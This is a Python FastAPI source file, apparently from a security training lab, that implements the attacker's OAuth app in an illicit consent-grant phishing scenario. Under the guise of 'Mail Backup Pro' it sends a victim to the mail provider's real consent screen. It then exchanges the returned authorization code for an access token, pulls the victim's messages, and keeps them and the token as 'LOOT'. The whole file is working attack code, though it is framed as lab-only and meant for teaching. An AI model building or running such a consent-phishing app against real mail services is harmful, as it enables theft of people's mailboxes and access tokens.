"""
Mail Backup Pro — the ATTACKER's OAuth app in KINGNET's consent-phishing scenario.

It never sees the victim's password or 2FA. It simply lures the victim (who is signed
in to the REAL KingMail) to KingMail's own consent screen, asking for mailbox access.
If the victim clicks "Allow", KingMail hands this app an authorization code; the app
swaps it for an access token and reads the mailbox. Classic illicit consent grant.
Lab-only — it can only talk to the bundled KingMail.
"""
import os

import httpx
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

# Public URL the victim's BROWSER uses to reach KingMail (for the authorize link).
KINGMAIL_PUBLIC = os.environ.get("KINGMAIL_PUBLIC", "http://localhost:8081").rstrip("/")
# URL this app uses server-to-server for token + API (in Docker: http://kingmail:8080).
KINGMAIL_INTERNAL = os.environ.get("KINGMAIL_INTERNAL", "http://localhost:8081").rstrip("/")
SELF_PUBLIC = os.environ.get("SELF_PUBLIC", "http://localhost:8070").rstrip("/")
CLIENT_ID = os.environ.get("OAUTH_CLIENT_ID", "mailbackup")
CLIENT_SECRET = os.environ.get("OAUTH_CLIENT_SECRET", "mailbackup-lab-secret")

app = FastAPI(title="Mail Backup Pro (KINGNET lab — attacker OAuth app)")
tpl = Jinja2Templates(directory=os.path.join(os.path.dirname(__file__), "templates"))
LOOT: dict = {}  # last exfiltrated mailbox, for the attacker's view


def authorize_url(state: str = "kingnetlab") -> str:
    from urllib.parse import urlencode
    q = urlencode({"response_type": "code", "client_id": CLIENT_ID,
                   "redirect_uri": f"{SELF_PUBLIC}/callback", "scope": "mail.read", "state": state})
    return f"{KINGMAIL_PUBLIC}/oauth/authorize?{q}"


@app.get("/healthz")
def healthz():
    return {"ok": True}


@app.get("/", response_class=HTMLResponse)
def home(request: Request):
    return tpl.TemplateResponse(request, "index.html", {"authorize_url": authorize_url()})


@app.get("/callback", response_class=HTMLResponse)
async def callback(request: Request, code: str = "", state: str = "", error: str = ""):
    if error or not code:
        return tpl.TemplateResponse(request, "loot.html",
                                    {"ok": False, "error": error or "no code returned", "loot": None})
    async with httpx.AsyncClient(timeout=15) as c:
        tok = await c.post(f"{KINGMAIL_INTERNAL}/oauth/token", data={
            "grant_type": "authorization_code", "code": code,
            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
            "redirect_uri": f"{SELF_PUBLIC}/callback"})
        if tok.status_code != 200:
            return tpl.TemplateResponse(request, "loot.html",
                                        {"ok": False, "error": f"token exchange failed: {tok.text}", "loot": None})
        access = tok.json()["access_token"]
        api = await c.get(f"{KINGMAIL_INTERNAL}/api/messages",
                          headers={"Authorization": f"Bearer {access}"})
    data = api.json()
    global LOOT
    LOOT = {"email": data.get("email"), "messages": data.get("messages", []), "token": access}
    return tpl.TemplateResponse(request, "loot.html", {"ok": True, "loot": LOOT, "error": ""})
